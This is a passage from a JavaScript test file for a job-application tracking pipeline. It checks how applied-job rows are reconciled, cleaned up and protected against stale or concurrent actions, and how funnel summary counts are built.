  const failedConfirmation = reconcileAppliedJobs(
    [],
    [markerOnly],
    [pending],
    [pending],
    schema,
    view,
    now,
    {
      processedActions: [
        {
          canonical_job_id: source.canonical_job_id,
          manual_action: "outcome_replied",
          source_state_guard: source.state_guard,
          processing_commit_guard: "commit:review:not-confirmed"
        }
      ],
      confirmedCommitGuards: []
    }
  );
  assert.deepEqual(failedConfirmation.clear_rows, []);
  assert.deepEqual(failedConfirmation.applied_rows, []);
  assert.equal(failedConfirmation.protected_action_count, 1);

  const replayPlan = processReviewActions(
    [],
    [updated],
    schema,
    now,
    {
      executionId: "applied-cleanup-replay",
      reviewConfig: view,
      appliedJobsRows: [pending]
    }
  );
  assert.deepEqual(replayPlan.archive_updates, []);
  assert.match(replayPlan.invalid_actions[0].error, /stale Applied Jobs action/);
  assert.equal(updated.outcome_events.length, 1);
  const replayCleanup = reconcileAppliedJobs(
    [],
    [updated],
    [pending],
    [pending],
    schema,
    view,
    now
  );
  assert.deepEqual(replayCleanup.clear_rows, []);
  assert.equal(replayCleanup.applied_rows[0]["Current outcome"], "replied");

  const empty = reconcileAppliedJobs([], [], [], [], schema, view, now);
  assert.deepEqual(empty, {
    applied_rows: [],
    desired_rows: [],
    rebase_rows: [],
    clear_rows: [],
    protected_action_count: 0,
    invalid_records: []
  });
});

test("Applied Jobs final cleanup protects an Action entered after reconciliation", () => {
  const projected = {
    row_number: 2,
    "Applied at": "2026-07-27T10:00:00.000Z",
    "Job title": "TypeScript Developer",
    Company: "Acme",
    "Generated message": "Copy-ready message",
    "Job link": "https://onlinejobs.ph/jobseekers/job/example",
    "Current outcome": "",
    "Outcome updated at": "",
    Action: "",
    canonical_job_id: "onlinejobs.ph:late-cleanup",
    source_state_guard: "guard-before"
  };
  const planned = {
    applied_clear_rows: [
      {
        canonical_job_id: projected.canonical_job_id,
        "Applied at": "",
        "Job title": "",
        Company: "",
        "Generated message": "",
        "Job link": "",
        "Current outcome": "",
        "Outcome updated at": ""
      }
    ],
    applied_rows: [
      {
        ...projected,
        row_number: undefined,
        source_state_guard: "guard-after"
      }
    ],
    applied_protected_action_count: 0
  };
  const latest = { ...projected, Action: "Offer" };
  const finalized = finalizeAppliedJobsCleanup(
    planned,
    [projected],
    [latest]
  );
  assert.deepEqual(finalized.applied_clear_rows, []);
  assert.equal(finalized.applied_rows.length, 1);
  assert.equal(finalized.applied_rebase_rows.length, 1);
  assert.equal(finalized.applied_rebase_rows[0].Action, "Offer");
  assert.equal(
    finalized.applied_rebase_rows[0].source_state_guard,
    "guard-after"
  );
  assert.equal(finalized.applied_last_minute_protected_actions, 1);

  const unchanged = finalizeAppliedJobsCleanup(
    planned,
    [projected],
    [
      {
        ...projected,
        row_number: 3,
        source_state_guard: "guard-after"
      }
    ]
  );
  assert.equal(unchanged.applied_clear_rows.length, 1);
  assert.equal(unchanged.applied_rows.length, 1);
  assert.deepEqual(unchanged.applied_rebase_rows, []);
  assert.equal(unchanged.applied_last_minute_protected_actions, 0);
});

test("Applied Jobs action snapshots fail closed for missing and duplicate identities", () => {
  const source = job({
    row_number: 103,
    source_job_id: "applied-duplicate-projection",
    canonical_job_id: "onlinejobs.ph:applied-duplicate-projection",
    pipeline_status: "applied",
    application_decision: "applied",
    application_decided_at: "2026-07-27T10:00:00.000Z"
  });
  source.state_guard = stateGuard(source);
  const blank = {
    row_number: 2,
    Action: "",
    canonical_job_id: source.canonical_job_id,
    source_state_guard: source.state_guard
  };
  const duplicateAction = {
    ...blank,
    row_number: 3,
    Action: "Offer"
  };
  const missingIdentityAction = {
    ...blank,
    row_number: 4,
    Action: "Rejected",
    canonical_job_id: ""
  };

  const reconciliation = reconcileAppliedJobs(
    [source],
    [],
    [blank, duplicateAction, missingIdentityAction],
    [blank],
    schema,
    view,
    now
  );

  assert.deepEqual(reconciliation.rebase_rows, []);
  assert.match(
    reconciliation.invalid_records
      .map((record) => record.error)
      .join("\n"),
    /duplicate canonical identity/
  );
  assert.match(
    reconciliation.invalid_records
      .map((record) => record.error)
      .join("\n"),
    /missing canonical identity/
  );
});

test("Applied Jobs clears stale display fields without positional deletion or Action loss", () => {
  const stale = {
    row_number: 7,
    "Applied at": "2026-07-27T10:00:00.000Z",
    "Job title": "Stale projected title",
    Company: "Stale projected company",
    "Generated message": "Stale projected message",
    "Job link": "https://onlinejobs.ph/jobseekers/job/stale-projection",
    "Current outcome": "offer",
    "Outcome updated at": "2026-07-28T08:00:00.000Z",
    Action: "",
    canonical_job_id: "onlinejobs.ph:stale-projection",
    source_state_guard: "guard-stale"
  };
  const cleared = reconcileAppliedJobs(
    [],
    [],
    [stale],
    [stale],
    schema,
    view,
    now
  );

  assert.deepEqual(cleared.applied_rows, []);
  assert.deepEqual(cleared.rebase_rows, []);
  assert.deepEqual(cleared.clear_rows, [
    {
      canonical_job_id: stale.canonical_job_id,
      "Applied at": "",
      "Job title": "",
      Company: "",
      "Generated message": "",
      "Job link": "",
      "Current outcome": "",
      "Outcome updated at": "",
      source_state_guard: ""
    }
  ]);
  assert.ok(!("row_number" in cleared.clear_rows[0]));
  assert.ok(!("Action" in cleared.clear_rows[0]));
  assert.equal(cleared.clear_rows[0].source_state_guard, "");

  const concurrentAction = reconcileAppliedJobs(
    [],
    [],
    [{ ...stale, row_number: 11, Action: "Interview" }],
    [stale],
    schema,
    view,
    now
  );
  assert.deepEqual(concurrentAction.clear_rows, []);
  assert.equal(concurrentAction.protected_action_count, 1);
});

test("funnel summary deduplicates active/archive and never infers outcomes", () => {
  const activeRows = [
    job({ source_job_id: "6201", canonical_job_id: "onlinejobs.ph:6201", pipeline_status: "ready" }),
    job({ source_job_id: "6202", canonical_job_id: "onlinejobs.ph:6202", pipeline_status: "review_required", generated_message: "" })
  ];
  const archiveRows = [
    job({
      row_number: 10,
      source_job_id: "6203",
      canonical_job_id: "onlinejobs.ph:6203",
      pipeline_status: "archived",
      archived_from_status: "applied",
      application_decision: "applied",
      outcome: ""
    }),
    job({
      row_number: 11,
      source_job_id: "6204",
      canonical_job_id: "onlinejobs.ph:6204",
      pipeline_status: "archived",
      archived_from_status: "applied",
      application_decision: "applied",
      outcome: "offer"
    })
  ];
  const summary = buildFunnelSummary(activeRows, archiveRows, schema, now);
  assert.equal(summary.total_unique_jobs, 4);
  assert.equal(summary.ready, 3);
  assert.equal(summary.applied, 2);
  assert.equal(summary.offer, 1);
  assert.equal(summary.replied, 0);
  assert.equal(summary.interview, 0);
});

test("empty review and funnel states contain no placeholder records", () => {
  assert.deepEqual(buildReviewQueue([], schema, now), []);
  assert.deepEqual(buildFunnelSummary([], [], schema, now), {
    metric_key: "current",
    generated_at: now,
    total_unique_jobs: 0,
    discovered: 0,
    recommended: 0,
    review_required: 0,
    ready: 0,
    applied: 0,
    skipped: 0,
    replied: 0,
    interview: 0,
    offer: 0,
    rejected: 0,
    retryable_error: 0,
    terminal_error: 0,
    unavailable: 0
  });
});
